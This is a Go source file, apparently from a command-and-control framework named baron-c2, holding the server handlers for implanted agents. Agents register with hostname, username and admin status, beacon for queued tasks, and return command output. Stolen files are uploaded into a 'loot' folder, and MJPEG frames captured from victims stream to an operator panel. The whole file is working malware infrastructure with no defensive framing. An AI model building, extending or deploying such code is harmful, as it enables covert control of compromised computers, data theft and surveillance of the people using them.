package api

import (
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"time"

	"baron-c2/internal/repo"
	"github.com/gin-gonic/gin"
	"github.com/rs/zerolog/log"
	"gorm.io/gorm"
)

// AgentRegister handles agent registration.
// Search order: id (primary key) → fingerprint fallback.
// Never overwrites fingerprint of existing agent.
func AgentRegister(c *gin.Context) {
	var input struct {
		ID          string `json:"id"`
		Hostname    string `json:"hostname"`
		Username    string `json:"username"`
		OS          string `json:"os"`
		Version     string `json:"version"`
		Fingerprint string `json:"fingerprint"`
		IsAdmin     bool   `json:"is_admin"`
		BuildToken  string `json:"build_token"`
	}

	if err := c.ShouldBindJSON(&input); err != nil {
		input.ID = c.GetHeader("X-ID")
		if input.ID == "" {
			input.ID = c.GetHeader("X-Client-ID")
		}
	}

	if input.ID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"ok": false, "error": "missing id"})
		return
	}

	if input.Fingerprint == "" {
		input.Fingerprint = input.ID
	}

	// Validate build token if provided
	if input.BuildToken != "" {
		var bt repo.BuildToken
		now := time.Now()
		if err := repo.DB.Where("token = ? AND used_at IS NULL AND expires_at > ?", input.BuildToken, now).
			First(&bt).Error; err != nil {
			c.JSON(http.StatusForbidden, gin.H{"ok": false, "error": "invalid build token"})
			return
		}
		// Mark token as used
		repo.DB.Model(&bt).Update("used_at", now)
	}

	log.Info().Str("ip", c.ClientIP()).Str("id", input.ID).Str("fp", input.Fingerprint).
		Msg("agent registration")

	var client repo.Client
	isNew := false

	// 1) Search by primary key (id)
	if err := repo.DB.First(&client, "id = ?", input.ID).Error; err != nil {
		// 2) Fallback: search by fingerprint
		if err2 := repo.DB.Where("fingerprint = ?", input.Fingerprint).First(&client).Error; err2 != nil {
			// Truly new agent
			isNew = true
			client.ID = input.ID
			client.Fingerprint = input.Fingerprint
			client.FirstSeen = time.Now()
		}
		// Found by fingerprint — keep its fingerprint, update id
		// (id may have changed due to re-generation)
	}

	// Update mutable fields — never overwrite Fingerprint if already set
	client.Hostname = input.Hostname
	client.Username = input.Username
	client.OS = input.OS
	client.IP = c.ClientIP()
	client.IsAdmin = input.IsAdmin
	client.Version = input.Version
	client.LastSeen = time.Now()
	client.Online = true
	if isNew {
		client.ID = input.ID
	}

	if err := repo.DB.Save(&client).Error; err != nil {
		log.Error().Err(err).Str("id", input.ID).Msg("failed to save client")
		c.JSON(http.StatusInternalServerError, gin.H{"error": "db error"})
		return
	}

	Broadcast(gin.H{
		"event": "client_new",
		"data": gin.H{
			"id":       client.ID,
			"hostname": client.Hostname,
			"ip":       client.IP,
		},
	})
	GlobalHub.BroadcastSystem("AGENT: registered " + client.ID + " [" + client.Hostname + "] from " + c.ClientIP())

	c.JSON(http.StatusOK, gin.H{"ok": true, "id": client.ID})
}

// AgentBeacon handles agent heartbeats and delivers tasks atomically.
// Uses a transaction with SELECT FOR UPDATE to prevent double-delivery
// when multiple replicas process beacons concurrently.
func AgentBeacon(c *gin.Context) {
	var input struct {
		ID string `json:"id"`
	}

	if err := c.ShouldBindJSON(&input); err != nil {
		input.ID = c.GetHeader("X-ID")
		if input.ID == "" {
			input.ID = c.GetHeader("X-Client-ID")
		}
	}

	if input.ID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"t": []interface{}{}})
		return
	}

	// Update last_seen — outside transaction, low risk, high frequency
	repo.DB.Model(&repo.Client{}).Where("id = ?", input.ID).Updates(map[string]interface{}{
		"last_seen": time.Now(),
		"online":    true,
		"ip":        c.ClientIP(),
	})

	// Atomic task delivery: SELECT FOR UPDATE prevents two concurrent beacons
	// from getting the same tasks (critical with multiple server replicas)
	var tasks []repo.Task
	err := repo.DB.Transaction(func(tx *gorm.DB) error {
		if err := tx.Set("gorm:query_option", "FOR UPDATE").
			Where("client_id = ? AND status = ?", input.ID, "pending").
			Find(&tasks).Error; err != nil {
			return err
		}
		if len(tasks) > 0 {
			ids := make([]string, len(tasks))
			for i, t := range tasks {
				ids[i] = t.ID
			}
			return tx.Model(&repo.Task{}).
				Where("id IN ? AND status = ?", ids, "pending").
				Update("status", "delivered").Error
		}
		return nil
	})

	if err != nil {
		log.Error().Err(err).Str("id", input.ID).Msg("beacon transaction failed")
		c.JSON(http.StatusInternalServerError, gin.H{"t": []interface{}{}})
		return
	}

	if len(tasks) > 0 {
		GlobalHub.BroadcastSystem("TASK: delivering " + strconv.Itoa(len(tasks)) + " task(s) to " + input.ID)
	}

	c.JSON(http.StatusOK, gin.H{"t": tasks})
}

// AgentResult handles command output from agents
func AgentResult(c *gin.Context) {
	var input struct {
		ID     string `json:"id"`
		TaskID string `json:"task_id"`
		Data   string `json:"data"`
	}

	if err := c.ShouldBindJSON(&input); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"ok": false})
		return
	}

	taskType := "result"
	if input.TaskID != "" {
		var task repo.Task
		if err := repo.DB.First(&task, "id = ?", input.TaskID).Error; err == nil {
			taskType = task.Command
			repo.DB.Model(&task).Update("status", "completed")
		}
	}

	result := repo.Result{
		ClientID:  input.ID,
		TaskID:    input.TaskID,
		Type:      taskType,
		Data:      input.Data,
		CreatedAt: time.Now(),
	}

	if err := repo.DB.Create(&result).Error; err != nil {
		log.Error().Err(err).Str("id", input.ID).Msg("failed to save result")
		c.JSON(http.StatusInternalServerError, gin.H{"ok": false})
		return
	}

	Broadcast(gin.H{
		"event": "result",
		"data": gin.H{
			"cid":  input.ID,
			"type": taskType,
			"data": input.Data,
		},
	})
	GlobalHub.BroadcastSystem("RESULT: <" + taskType + "> from " + input.ID)

	c.JSON(http.StatusOK, gin.H{"ok": true})
}

// AgentStream handles MJPEG/Audio streams
func AgentStream(c *gin.Context) {
	c.JSON(http.StatusNotImplemented, gin.H{"ok": false, "error": "stream not implemented"})
}

const maxUploadSize = 50 << 20 // 50 MB

// AgentUpload handles file uploads from agents.
// Enforces 50MB limit, organizes files by client_id, uses unique filenames.
func AgentUpload(c *gin.Context) {
	c.Request.Body = http.MaxBytesReader(c.Writer, c.Request.Body, maxUploadSize)

	file, err := c.FormFile("file")
	if err != nil {
		if err.Error() == "http: request body too large" {
			c.JSON(http.StatusRequestEntityTooLarge, gin.H{"ok": false, "error": "file too large (max 50MB)"})
			return
		}
		c.JSON(http.StatusBadRequest, gin.H{"ok": false, "error": "no file uploaded"})
		return
	}

	clientID := c.GetHeader("X-Client-ID")
	if clientID == "" {
		clientID = "unknown"
	}

	// Sanitize and make unique: <clientID>/<timestamp>_<original>
	origName := filepath.Base(file.Filename)
	uniqueName := fmt.Sprintf("%d_%s", time.Now().UnixNano(), origName)
	lootDir := filepath.Join("loot", clientID)
	if err := os.MkdirAll(lootDir, 0750); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"ok": false, "error": "storage error"})
		return
	}

	savePath := filepath.Join(lootDir, uniqueName)
	if err := c.SaveUploadedFile(file, savePath); err != nil {
		log.Error().Err(err).Str("id", clientID).Msg("failed to save uploaded file")
		c.JSON(http.StatusInternalServerError, gin.H{"ok": false, "error": "save failed"})
		return
	}

	log.Info().Str("id", clientID).Str("file", origName).Int64("size", file.Size).Msg("file uploaded")

	Broadcast(gin.H{
		"event": "upload_new",
		"data": gin.H{
			"filename": uniqueName,
			"original": origName,
			"size":     file.Size,
			"cid":      clientID,
		},
	})
	GlobalHub.BroadcastSystem(fmt.Sprintf("LOOT: [%s] %d bytes from %s", origName, file.Size, clientID))

	c.JSON(http.StatusOK, gin.H{"ok": true, "path": savePath})
}

// AgentStreamFrame handles incoming MJPEG frames from the agent.
// It directly broadcasts them to the Web Panel via WebSocket.
func AgentStreamFrame(c *gin.Context) {
	var input struct {
		ID    string `json:"id"`
		Frame string `json:"frame"` // Base64 encoded JPEG
	}

	if err := c.ShouldBindJSON(&input); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"ok": false})
		return
	}

	if input.ID == "" || input.Frame == "" {
		c.JSON(http.StatusBadRequest, gin.H{"ok": false})
		return
	}

	// Broadcast directly to panel
	Broadcast(gin.H{
		"event": "stream_frame",
		"data": gin.H{
			"cid":   input.ID,
			"frame": input.Frame,
		},
	})

	c.JSON(http.StatusOK, gin.H{"ok": true})
}
